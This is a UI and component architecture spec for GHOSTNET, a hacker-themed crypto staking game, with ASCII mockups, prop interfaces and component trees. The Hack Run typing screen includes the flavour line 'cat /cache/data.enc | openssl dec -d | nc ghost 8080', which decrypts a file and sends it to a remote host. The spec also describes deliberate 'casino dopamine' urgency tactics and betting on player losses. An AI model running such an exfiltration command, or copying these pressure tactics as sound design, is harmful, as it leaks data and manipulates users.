# GHOSTNET UI & Components Architecture

**Version:** 1.0  
**Status:** Planning  
**Last Updated:** 2026-01-19  
**Source:** docs/product/master-design.md

---

## Table of Contents

1. [Overview](#1-overview)
2. [Screen Inventory](#2-screen-inventory)
3. [Command Center (Main Screen)](#3-command-center-main-screen)
4. [Mini-Game Screens](#4-mini-game-screens)
5. [Component Hierarchy](#5-component-hierarchy)
6. [Design System Components](#6-design-system-components)
7. [Component Patterns](#7-component-patterns)
8. [Animation & Effects](#8-animation--effects)
9. [Responsive Design](#9-responsive-design)
10. [Implementation Checklist](#10-implementation-checklist)

---

## 1. Overview

### Design Philosophy

From the master design document:

> "The main screen is the heart of GHOSTNET. It's not a static dashboard—it's a **living terminal** that streams the entire network's activity in real-time."

**Key Principles:**
1. **Information Density** - Every pixel conveys meaningful data
2. **Constant Motion** - Something is always updating, scrolling, changing
3. **Urgency Signals** - Timers, countdowns, warnings everywhere
4. **Social Proof** - See others winning, losing, playing in real-time
5. **Your Position** - Always visible, always updating

### Visual Language

| Element | Style |
|---------|-------|
| Aesthetic | Terminal/Hacker + Casino dopamine |
| Font | IBM Plex Mono (monospace) |
| Colors | Green on black, with red/amber/cyan accents |
| Borders | ASCII box drawing characters |
| Effects | CRT scanlines, screen flicker, glow |

---

## 2. Screen Inventory

### Primary Screens

| Screen | Route | Priority | Description |
|--------|-------|----------|-------------|
| **Command Center** | `/` | P0 | Main dashboard - Feed, Position, Network Vitals |
| **Trace Evasion** | `/typing` | P0 | Typing mini-game |
| **Hack Runs** | `/hackrun` | P1 | Node-based decision/typing game |
| **Dead Pool** | `/deadpool` | P1 | Prediction market |
| **Crew** | `/crew` | P2 | Crew management and chat |
| **PvP Duels** | `/pvp` | P2 | Competitive typing |
| **Leaderboard** | `/leaderboard` | P2 | Rankings |
| **Market** | `/market` | P3 | Black Market consumables |

### Modal Overlays

| Modal | Trigger | Purpose |
|-------|---------|---------|
| Jack In | Quick action [J] | Stake selection flow |
| Extract | Quick action [E] | Withdrawal confirmation |
| Wallet Connect | Header button | Wallet connection |
| Settings | Header [?] | Audio, preferences |
| Transaction Status | After tx submit | Pending/Success/Fail |

---

## 3. Command Center (Main Screen)

### Layout Specification

From master design (Section 4):

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ GHOSTNET v1.0.7 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ NETWORK: ONLINE   │
├────────────────────────────────────────┬─────────────────────────────────────┤
│                                        │                                     │
│           LIVE FEED                    │         YOUR STATUS                 │
│                                        │                                     │
│  > 0x7a3f jacked in [DARKNET] 500Đ    │  ┌─────────────────────────────┐   │
│  > 0x9c2d ████ TRACED ████ -Loss 120Đ │  │ OPERATOR: 0x7a3f...9c2d    │   │
│  > 0x3b1a extracted 847Đ [+312 gain]  │  │ STATUS: JACKED IN          │   │
│  > TRACE SCAN [DARKNET] in 00:45      │  │ LEVEL: DARKNET             │   │
│  > 0x8f2e jacked in [BLACK ICE] 50Đ   │  │ STAKED: 500 $DATA          │   │
│  > 0x1d4c ████ TRACED ████ -Loss 200Đ │  │                            │   │
│  > 0x5e7b survived [SUBNET] streak: 12│  │ DEATH RATE: 32% ▼          │   │
│  > SYSTEM RESET in 04:32:17           │  │ YIELD: 31,500% APY         │   │
│  > 0x2a9f crew [PHANTOMS] +10% boost  │  │ NEXT SCAN: 01:23           │   │
│  > 0x6c3d perfect hack run [3x mult]  │  │                            │   │
│  > 0x4b8e jacked in [MAINFRAME] 1000Đ │  │ EXTRACTED: 2,847 $DATA     │   │
│  > ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │  │ GHOST STREAK: 7 🔥         │   │
│                                        │  └─────────────────────────────┘   │
│  ▼ SCROLL FOR MORE                     │                                     │
│                                        │  ┌─────────────────────────────┐   │
├────────────────────────────────────────┤  │ ACTIVE MODIFIERS            │   │
│                                        │  │                             │   │
│        NETWORK VITALS                  │  │ ✓ Trace Evasion    -15%    │   │
│                                        │  │ ✓ Hack Run 3x      2h rem  │   │
│  TOTAL VALUE LOCKED    $4,847,291     │  │ ✓ Daily Boost      +5%     │   │
│  ████████████████████░░ 89% CAPACITY   │  │ ✓ Crew Bonus       +10%    │   │
│                                        │  │                             │   │
│  OPERATORS ONLINE         1,247       │  └─────────────────────────────┘   │
│  ███████████░░░░░░░░░ 58% OF ATH       │                                     │
│                                        │  ┌─────────────────────────────┐   │
│  SYSTEM RESET    ████████░░ 04:32:17  │  │ QUICK ACTIONS               │   │
│  ▲ CRITICAL - NEEDS DEPOSITS           │  │                             │   │
│                                        │  │ [J] JACK IN MORE            │   │
│  LAST HOUR:                            │  │ [E] EXTRACT ALL             │   │
│  ├─ Jacked In:    +$127,400           │  │ [T] TRACE EVASION           │   │
│  ├─ Extracted:    -$89,200            │  │ [H] HACK RUN                │   │
│  ├─ Traced/Lost:  -$34,100            │  │ [C] CREW                    │   │
│  └─ Net Flow:     +$4,100 ▲           │  │ [P] DEAD POOL               │   │
│                                        │  │                             │   │
│  BURN RATE: 847 $DATA/hr 🔥           │  └─────────────────────────────┘   │
│                                        │                                     │
├────────────────────────────────────────┴─────────────────────────────────────┤
│                                                                              │
│  [NETWORK]  [POSITION]  [GAMES]  [CREW]  [MARKET]  [LEADERBOARD]  [?]       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### Component Breakdown

```
CommandCenter/
├── Header
│   ├── Logo ("GHOSTNET v1.0.7")
│   ├── StatusBar (animated glitch line)
│   ├── NetworkStatus ("NETWORK: ONLINE")
│   └── WalletButton
│
├── MainContent (two-column grid)
│   │
│   ├── LeftColumn
│   │   ├── FeedPanel
│   │   │   ├── FeedHeader ("LIVE FEED" + streaming indicator)
│   │   │   ├── FeedList
│   │   │   │   └── FeedItem (x15 visible)
│   │   │   └── FeedFooter ("▼ SCROLL FOR MORE")
│   │   │
│   │   └── NetworkVitalsPanel
│   │       ├── StatRow (TVL + progress bar)
│   │       ├── StatRow (Operators Online + progress bar)
│   │       ├── SystemResetTimer (critical styling)
│   │       ├── HourlyFlow (tree-style list)
│   │       └── BurnRate
│   │
│   └── RightColumn
│       ├── PositionPanel (Box component)
│       │   ├── OperatorAddress
│       │   ├── StatusBadge
│       │   ├── LevelBadge
│       │   ├── StakedAmount
│       │   ├── DeathRateDisplay (with trend arrow)
│       │   ├── YieldDisplay (animated APY)
│       │   ├── NextScanCountdown
│       │   ├── ExtractedTotal
│       │   └── GhostStreak (with fire emoji)
│       │
│       ├── ModifiersPanel (Box component)
│       │   └── ModifierItem (x4)
│       │       ├── CheckIcon
│       │       ├── ModifierName
│       │       └── ModifierValue/Duration
│       │
│       └── QuickActionsPanel (Box component)
│           └── ActionButton (x6)
│               ├── HotkeyBadge ("[J]")
│               └── ActionLabel
│
└── NavigationBar
    └── NavButton (x7)
```

### Component Specifications

#### FeedItem

```typescript
interface FeedItemProps {
  type: 'JACK_IN' | 'EXTRACT' | 'TRACED' | 'SURVIVED' | 
        'SCAN_WARNING' | 'SYSTEM_WARNING' | 'JACKPOT' | 
        'CREW_EVENT' | 'MINIGAME' | 'WHALE_ALERT';
  address?: string;
  level?: Level;
  amount?: bigint;
  gain?: bigint;
  streak?: number;
  timeUntil?: number;
  isCurrentUser?: boolean;
}

// Visual styling from master design:
// - JACK_IN: Green text, subtle pulse
// - EXTRACT: Gold/cyan text, coin animation
// - TRACED: RED FLASH, glitch effect, screen flash
// - SURVIVED: Green pulse, ghost emoji
// - SCAN_WARNING: Amber/yellow, pulsing
// - SYSTEM_WARNING: Red, urgent pulsing
// - JACKPOT: GOLD text, particle effects, screen shake
// - WHALE_ALERT: Special icon, larger text, glow
```

#### PositionPanel

```typescript
interface PositionPanelProps {
  position: {
    address: string;
    status: 'JACKED_IN' | 'NOT_JACKED_IN';
    level: Level;
    stakedAmount: bigint;
    baseDeathRate: number;
    effectiveDeathRate: number;
    deathRateTrend: 'up' | 'down' | 'stable';
    yieldApy: number;
    nextScanSeconds: number;
    extractedTotal: bigint;
    ghostStreak: number;
  } | null;
}
```

#### NetworkVitalsPanel

```typescript
interface NetworkVitalsProps {
  tvl: bigint;
  tvlCapacityPercent: number;
  operatorsOnline: number;
  operatorsAthPercent: number;
  systemResetSeconds: number;
  systemResetCritical: boolean; // < 1 hour
  hourlyFlow: {
    jackedIn: bigint;
    extracted: bigint;
    traced: bigint;
    netFlow: bigint;
  };
  burnRatePerHour: bigint;
}
```

---

## 4. Mini-Game Screens

### 4.1 Trace Evasion (Typing)

From master design (Section 10.1):

#### State Machine

```
IDLE → COUNTDOWN → TYPING → COMPLETE
         (3s)      (30-60s)
```

#### Screen: IDLE State

```
╔══════════════════════════════════════════════════════════════════╗
║                    TRACE EVASION PROTOCOL                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  Your next scan: 01:23:45                                         ║
║  Current protection: NONE                                         ║
║                                                                   ║
║  Your position: DARKNET (500Đ)                                    ║
║  Base death rate: 45%                                             ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  Complete typing challenges to reduce your trace probability.     ║
║  Protection lasts until your next trace scan.                     ║
║                                                                   ║
║  REWARD TIERS:                                                    ║
║  ├── 50-69% accuracy    -5% death rate                           ║
║  ├── 70-84% accuracy    -10% death rate                          ║
║  ├── 85-94% accuracy    -15% death rate                          ║
║  ├── 95-99% accuracy    -20% death rate                          ║
║  └── 100% (Perfect)     -25% death rate                          ║
║                                                                   ║
║  SPEED BONUSES:                                                   ║
║  ├── > 80 WPM + 95% acc   Additional -5%                         ║
║  └── > 100 WPM + 95% acc  Additional -10%                        ║
║                                                                   ║
║                    [ACTIVATE TRACE EVASION]                       ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Screen: COUNTDOWN State

```
╔══════════════════════════════════════════════════════════════════╗
║                    TRACE EVASION PROTOCOL                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║                                                                   ║
║                                                                   ║
║                   PREPARE FOR EVASION SEQUENCE                    ║
║                                                                   ║
║                                                                   ║
║                                                                   ║
║                           ┌─────┐                                 ║
║                           │  3  │                                 ║
║                           └─────┘                                 ║
║                                                                   ║
║                                                                   ║
║                                                                   ║
║                   Position your hands on keyboard                 ║
║                                                                   ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Screen: TYPING State

```
╔══════════════════════════════════════════════════════════════════╗
║                    TRACE EVASION PROTOCOL                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > SCRAMBLE SEQUENCE REQUIRED                                     ║
║  > TYPE THE FOLLOWING COMMAND:                                    ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │  ssh -L 8080:localhost:443 ghost@proxy.darknet.io          │  ║
║  │  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  │  ║
║  │                        ↑ cursor                             │  ║
║  │  ssh -L 8080:localhost                                      │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  ████████████████████████████░░░░░░░░░░░░░░░░░░░░  65%           ║
║                                                                   ║
║  ┌──────────────┬──────────────┬──────────────┐                  ║
║  │ SPEED        │ ACCURACY     │ TIME         │                  ║
║  │ 72 WPM       │ 94%          │ 18s          │                  ║
║  └──────────────┴──────────────┴──────────────┘                  ║
║                                                                   ║
║  PROJECTED REWARD: -15% death rate                                ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Screen: COMPLETE State

```
╔══════════════════════════════════════════════════════════════════╗
║                    TRACE EVASION PROTOCOL                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║                    ✓ EVASION PROTOCOL ACTIVE                      ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  RESULTS:                                                         ║
║                                                                   ║
║  Speed:              76 WPM                                       ║
║  Accuracy:           94%                                          ║
║  Time:               24.3 seconds                                 ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  REWARD EARNED:                                                   ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │  Protection: -15% death rate                               │  ║
║  │  Active until: Next trace scan (01:23:45)                  │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  Base death rate:       45%                                       ║
║  New effective rate:    30% ▼                                     ║
║                                                                   ║
║  [PRACTICE AGAIN]                      [RETURN TO NETWORK]        ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
TypingGame/
├── TypingHeader
│   ├── Title ("TRACE EVASION PROTOCOL")
│   └── ScanCountdown (next scan timer)
│
├── IdleView
│   ├── PositionSummary
│   ├── CurrentProtection
│   ├── RewardTiersTable
│   └── StartButton
│
├── CountdownView
│   ├── Instructions
│   ├── CountdownNumber (animated)
│   └── HandPositionHint
│
├── ActiveView
│   ├── CommandPrompt
│   ├── TargetText (with cursor highlighting)
│   ├── TypedText (green for correct, red flash for error)
│   ├── ProgressBar
│   ├── StatsRow (WPM, Accuracy, Time)
│   └── ProjectedReward
│
└── CompleteView
    ├── SuccessIcon (checkmark animation)
    ├── ResultsTable
    ├── RewardCard
    ├── DeathRateComparison (before/after)
    └── ActionButtons
```

---

### 4.2 Hack Runs

From master design (Section 10.2):

#### Run Structure

```
START ──▶ NODE 1 ──▶ NODE 2 ──▶ NODE 3 ──▶ NODE 4 ──▶ NODE 5 ──▶ EXTRACT
           │          │          │          │          │
        FIREWALL   PATROL    DATA CACHE    TRAP      ICE WALL
```

#### Screen: Node Decision

```
╔══════════════════════════════════════════════════════════════════╗
║  HACK RUN - NODE 3/5                                              ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    ║
║  ○ ──── ○ ──── ● ──── ○ ──── ○                                  ║
║  1      2      3      4      5                                   ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  OBSTACLE: DATA CACHE                                             ║
║  "High-value extraction point. Heavy encryption."                 ║
║                                                                   ║
║  ┌─────────────────────────────────────────────────────────────┐ ║
║  │ [A] BRUTE FORCE DECRYPT                                     │ ║
║  │     Trace Risk: 40%   │   Reward: +200Đ                     │ ║
║  │     Typing: ████████░░ Hard                                 │ ║
║  ├─────────────────────────────────────────────────────────────┤ ║
║  │ [B] STEALTH SIPHON                                          │ ║
║  │     Trace Risk: 15%   │   Reward: +75Đ                      │ ║
║  │     Typing: ████░░░░░░ Easy                                 │ ║
║  ├─────────────────────────────────────────────────────────────┤ ║
║  │ [C] EXPLOIT ZERO-DAY (Requires: Exploit Kit)               │ ║
║  │     Trace Risk: 25%   │   Reward: +150Đ                     │ ║
║  │     Typing: ██████░░░░ Medium                               │ ║
║  │     ⚡ YOU HAVE THIS ITEM                                   │ ║
║  └─────────────────────────────────────────────────────────────┘ ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │ HP: ███████░░░ 70%     │     Extracted: 425Đ               │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  [SELECT OPTION]               [ABORT RUN - Keep 50% extracted]  ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Screen: Node Execution (Typing)

```
╔══════════════════════════════════════════════════════════════════╗
║  EXECUTING: STEALTH SIPHON                                        ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > Initiating covert extraction...                                ║
║  > TYPE TO EXECUTE:                                               ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │  cat /cache/data.enc | openssl dec -d | nc ghost 8080      │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  ████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░  40%               ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  SPEED: 67 WPM          ACCURACY: 96%                            ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │  BASE RISK:       15%                                      │  ║
║  │  TYPING BONUS:    -8% (for high accuracy)                  │  ║
║  │  EFFECTIVE RISK:  7%                                       │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  TIME REMAINING: 22s                                              ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
HackRun/
├── HackRunHeader
│   ├── Title
│   └── NodeProgress (○ ──── ○ ──── ● ──── ○ ──── ○)
│
├── NodeDecisionView
│   ├── ObstacleCard
│   │   ├── ObstacleType
│   │   └── Description
│   │
│   ├── OptionsList
│   │   └── OptionCard (x3)
│   │       ├── HotkeyBadge
│   │       ├── OptionName
│   │       ├── TraceRisk
│   │       ├── Reward
│   │       ├── TypingDifficulty (progress bar)
│   │       └── ItemRequired (optional, with ownership badge)
│   │
│   ├── StatusBar
│   │   ├── HPBar
│   │   └── ExtractedAmount
│   │
│   └── ActionButtons (Select / Abort)
│
├── NodeExecutionView
│   ├── ExecutionHeader
│   ├── CommandDisplay
│   ├── TypingArea
│   ├── ProgressBar
│   ├── StatsRow
│   ├── RiskCalculation
│   └── TimeRemaining
│
└── ResultView
    ├── NodeOutcome (Success/Fail)
    ├── DamageReceived (if any)
    ├── RewardReceived (if any)
    └── ContinueButton
```

---

### 4.3 Dead Pool (Prediction Market)

From master design (Section 11):

#### Screen: Betting Interface

```
╔══════════════════════════════════════════════════════════════════╗
║                         THE DEAD POOL                             ║
║                    "Bet on Entropy"                               ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  ROUND TYPE: BLACK ICE Scan Prediction                            ║
║  CURRENT ROUND: #4,847                                            ║
║  TIME REMAINING: 08:42                                            ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  THE QUESTION:                                                    ║
║  "How many operators will be TRACED in the next BLACK ICE scan?" ║
║                                                                   ║
║  THE LINE: 50 deaths                                              ║
║                                                                   ║
║  ┌──────────────────────┬──────────────────────┐                 ║
║  │                      │                      │                 ║
║  │   [UNDER 50]         │   [OVER 50]          │                 ║
║  │                      │                      │                 ║
║  │   Pool: 12,400 $DATA │   Pool: 8,200 $DATA  │                 ║
║  │   Implied: 60%       │   Implied: 40%       │                 ║
║  │   Payout: 1.66x      │   Payout: 2.51x      │                 ║
║  │                      │                      │                 ║
║  │   [BET UNDER]        │   [BET OVER]         │                 ║
║  │                      │                      │                 ║
║  └──────────────────────┴──────────────────────┘                 ║
║                                                                   ║
║  CONTEXT:                                                         ║
║  • 127 operators currently in BLACK ICE                          ║
║  • Base trace rate: 90%                                          ║
║  • Network modifier: 0.92x (high TVL)                            ║
║  • Expected deaths: ~105                                          ║
║  • Line seems LOW → OVER might be value?                         ║
║                                                                   ║
║  YOUR POSITION: None                                              ║
║                                                                   ║
║  [VIEW HISTORY] [HEDGING CALCULATOR]                             ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
DeadPool/
├── DeadPoolHeader
│   ├── Title ("THE DEAD POOL")
│   ├── Subtitle ("Bet on Entropy")
│   └── RoundInfo (type, number)
│
├── QuestionCard
│   ├── QuestionText
│   ├── Line (the number)
│   └── TimeRemaining
│
├── BettingOptions (two-column)
│   └── BettingOption (x2)
│       ├── OptionLabel (UNDER/OVER)
│       ├── PoolSize
│       ├── ImpliedOdds
│       ├── PayoutMultiplier
│       └── BetButton
│
├── ContextPanel
│   ├── ContextItem (operators count)
│   ├── ContextItem (base trace rate)
│   ├── ContextItem (network modifier)
│   ├── ContextItem (expected deaths)
│   └── AnalysisHint ("Line seems LOW...")
│
├── UserPosition
│   └── CurrentBet (or "None")
│
├── BetModal (overlay)
│   ├── AmountInput
│   ├── PayoutPreview
│   └── ConfirmButton
│
└── SecondaryActions
    ├── ViewHistoryButton
    └── HedgeCalculatorButton
```

---

### 4.4 Crew Panel

From master design (Section 14):

```
╔══════════════════════════════════════════════════════════════════╗
║                      CREW: PHANTOM_COLLECTIVE                     ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  MEMBERS: 12/20                        RANK: #47                  ║
║  TOTAL STAKED: 14,200Đ                 WEEKLY EXTRACT: 8,400Đ    ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  ACTIVE BONUSES:                                                  ║
║  ├── Crew Size (10+)      +5% yield for all members              ║
║  ├── Daily Sync (3/3)     +10% yield today                       ║
║  └── Survival Streak (8)  -3% death rate for all                 ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  MEMBERS ONLINE:                                                  ║
║  ● 0x7a3f (You)    DARKNET    500Đ    Streak: 7                 ║
║  ● 0x9c2d          SUBNET     300Đ    Streak: 4                 ║
║  ● 0x3b1a          BLACK ICE  100Đ    Streak: 2                 ║
║  ○ 0x8f2e          MAINFRAME  200Đ    (Offline)                 ║
║  ...                                                              ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  CREW CHAT:                                                       ║
║  [0x9c2d]: gl everyone, scan in 2 min                            ║
║  [0x3b1a]: im so cooked lmao                                     ║
║  [You]: we got this                                               ║
║  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║                                                                   ║
║  [CREW SETTINGS] [INVITE] [LEAVE CREW]                           ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
CrewPanel/
├── CrewHeader
│   ├── CrewName
│   ├── MemberCount (x/20)
│   └── Rank
│
├── CrewStats
│   ├── TotalStaked
│   └── WeeklyExtract
│
├── BonusesSection
│   └── BonusItem (x3)
│       ├── BonusName
│       ├── Condition
│       └── Effect
│
├── MembersList
│   └── MemberRow
│       ├── OnlineIndicator (● / ○)
│       ├── Address (truncated, "(You)" badge)
│       ├── Level
│       ├── StakedAmount
│       └── Streak (or "Offline")
│
├── CrewChat
│   ├── ChatMessages
│   │   └── ChatMessage
│   │       ├── SenderAddress
│   │       └── MessageText
│   └── ChatInput
│
└── ActionButtons
    ├── SettingsButton
    ├── InviteButton
    └── LeaveButton
```

---

### 4.5 PvP Duels

From master design (Section 10.5):

```
╔══════════════════════════════════════════════════════════════════╗
║                         PVP DUEL                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  YOU                              VS                    OPPONENT  ║
║  0x7a3f                                                 0x9c2d   ║
║  Rank: #847                                           Rank: #234  ║
║  Win Rate: 67%                                      Win Rate: 71% ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  WAGER: 50Đ each (Winner takes 90Đ, 10Đ burned)                  ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  STATUS: RACING                                                   ║
║                                                                   ║
║  YOUR PROGRESS:                                                   ║
║  ████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  42%            ║
║  WPM: 78    ACC: 96%                                              ║
║                                                                   ║
║  OPPONENT PROGRESS:                                               ║
║  ██████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  38%            ║
║  WPM: 71    ACC: 94%                                              ║
║                                                                   ║
║  TIME: 34s remaining                                              ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
PvPDuel/
├── DuelHeader
│   └── Title ("PVP DUEL")
│
├── PlayersDisplay
│   ├── PlayerCard (You)
│   │   ├── Address
│   │   ├── Rank
│   │   └── WinRate
│   │
│   ├── VsSeparator ("VS")
│   │
│   └── PlayerCard (Opponent)
│       ├── Address
│       ├── Rank
│       └── WinRate
│
├── WagerInfo
│   ├── WagerAmount
│   ├── WinnerPrize
│   └── BurnAmount
│
├── RaceStatus
│   ├── StatusLabel ("RACING" / "WAITING" / "COMPLETE")
│   │
│   ├── ProgressSection (You)
│   │   ├── ProgressBar
│   │   ├── WPM
│   │   └── Accuracy
│   │
│   └── ProgressSection (Opponent)
│       ├── ProgressBar
│       ├── WPM
│       └── Accuracy
│
├── TimeRemaining
│
└── TypingArea (when racing)
```

---

### 4.6 Daily Ops

From master design (Section 10.4):

```
╔══════════════════════════════════════════════════════════════════╗
║                         DAILY OPS                                 ║
║                    Resets in: 18:42:33                            ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  ✓ SIGNAL CHECK                               COMPLETE            ║
║    Complete 1 typing challenge                 Reward: +5% yield  ║
║                                                                   ║
║  ○ NETWORK PATROL                             0/3                 ║
║    Check in 3 times today                      Reward: -3% death  ║
║                                                                   ║
║  ○ DATA PACKET                                AVAILABLE           ║
║    Claim daily $DATA                           Reward: 10Đ free   ║
║                                                                   ║
║  ○ CREW SYNC                                  1/3 CREW MEMBERS    ║
║    3 crew members complete dailies             Reward: +10% crew  ║
║                                                                   ║
║  ○ STREAK KEEPER                              6/7 DAYS            ║
║    Complete all dailies 7 days straight        Reward: 100Đ bonus ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  CURRENT STREAK: 6 days 🔥                                        ║
║  TOTAL DAILY BONUS: +5% yield (more available)                   ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

#### Component Breakdown

```
DailyOps/
├── DailyOpsHeader
│   ├── Title ("DAILY OPS")
│   └── ResetCountdown
│
├── TasksList
│   └── TaskItem (x5)
│       ├── StatusIcon (✓ / ○)
│       ├── TaskName
│       ├── Description
│       ├── Progress (optional: "0/3", "6/7 DAYS")
│       ├── Reward
│       └── ActionButton (when actionable)
│
├── StreakDisplay
│   ├── StreakCount
│   └── FireEmoji
│
└── TotalBonusSummary
```

---

## 5. Component Hierarchy

### Full Component Tree

```
App
├── Providers
│   ├── EventBusProvider
│   ├── AudioProvider
│   ├── VisualEffectsProvider
│   ├── Web3Provider
│   └── RealtimeProvider
│
├── TerminalShell
│   ├── Scanlines
│   ├── Flicker
│   ├── ScreenFlash
│   │
│   └── Router
│       │
│       ├── CommandCenter (/)
│       │   ├── Header
│       │   ├── MainContent
│       │   │   ├── LeftColumn
│       │   │   │   ├── FeedPanel
│       │   │   │   └── NetworkVitalsPanel
│       │   │   └── RightColumn
│       │   │       ├── PositionPanel
│       │   │       ├── ModifiersPanel
│       │   │       └── QuickActionsPanel
│       │   └── NavigationBar
│       │
│       ├── TypingGame (/typing)
│       │   ├── IdleView
│       │   ├── CountdownView
│       │   ├── ActiveView
│       │   └── CompleteView
│       │
│       ├── HackRun (/hackrun)
│       │   ├── NodeDecisionView
│       │   ├── NodeExecutionView
│       │   └── ResultView
│       │
│       ├── DeadPool (/deadpool)
│       │   └── BettingInterface
│       │
│       ├── Crew (/crew)
│       │   └── CrewPanel
│       │
│       ├── PvP (/pvp)
│       │   ├── Lobby
│       │   └── DuelArena
│       │
│       └── Leaderboard (/leaderboard)
│
└── Modals
    ├── JackInModal
    ├── ExtractModal
    ├── WalletModal
    ├── SettingsModal
    └── TransactionModal
```

---

## 6. Design System Components

### 6.1 Primitives

```
primitives/
├── Button.svelte
│   Props: variant ('primary' | 'secondary' | 'danger' | 'ghost')
│          size ('sm' | 'md' | 'lg')
│          hotkey (optional, e.g., "[J]")
│          disabled
│          loading
│
├── Input.svelte
│   Props: type ('text' | 'number')
│          placeholder
│          disabled
│          error
│
├── ProgressBar.svelte
│   Props: value (0-100)
│          variant ('default' | 'danger' | 'warning' | 'success')
│          showPercent
│          animated
│
├── AnimatedNumber.svelte
│   Props: value
│          format (function)
│          duration
│
├── Countdown.svelte
│   Props: seconds
│          format ('mm:ss' | 'hh:mm:ss')
│          urgent (threshold for red styling)
│          onComplete (callback)
│
├── Badge.svelte
│   Props: variant ('level' | 'status' | 'hotkey')
│          children
│
├── Spinner.svelte
│   Props: size ('sm' | 'md' | 'lg')
│
├── Tooltip.svelte
│   Props: content
│          position ('top' | 'bottom' | 'left' | 'right')
│
└── Icon.svelte
    Props: name (icon identifier)
           size
```

### 6.2 Terminal Components

```
terminal/
├── Shell.svelte
│   - Full screen terminal wrapper
│   - Applies background, font, base styles
│
├── Scanlines.svelte
│   - CRT scanline overlay effect
│
├── Flicker.svelte
│   - Subtle screen flicker animation
│   Props: enabled
│
├── ScreenFlash.svelte
│   - Full-screen color flash (subscribes to effects)
│
├── Box.svelte
│   - ASCII box with title
│   Props: title
│          variant ('single' | 'double' | 'rounded')
│          padding
│
├── Panel.svelte
│   - Content panel with optional header
│   Props: title
│          scrollable
│          maxHeight
│
├── Divider.svelte
│   - Horizontal line divider
│   Props: variant ('single' | 'double' | 'dashed')
│
└── TreeList.svelte
    - Hierarchical list with tree characters (├── └──)
    Props: items
```

### 6.3 Data Display Components

```
data-display/
├── StatRow.svelte
│   - Label + value + optional progress bar
│   Props: label
│          value
│          progress (optional)
│          trend ('up' | 'down' | 'stable')
│
├── AddressDisplay.svelte
│   - Truncated address with copy button
│   Props: address
│          truncate (boolean)
│          showCopy
│
├── AmountDisplay.svelte
│   - Token amount with symbol
│   Props: amount (bigint)
│          symbol ('$DATA' | 'ETH')
│          showUsd
│
├── PercentDisplay.svelte
│   - Percentage with color coding
│   Props: value
│          format ('whole' | 'decimal')
│          colorScale ('danger' | 'success')
│
├── TimeDisplay.svelte
│   - Formatted time/countdown
│   Props: seconds
│          format
│
└── LevelBadge.svelte
    - Security clearance level badge
    Props: level ('VAULT' | 'MAINFRAME' | 'SUBNET' | 'DARKNET' | 'BLACK_ICE')
```

### 6.4 Form Components

```
forms/
├── NumberInput.svelte
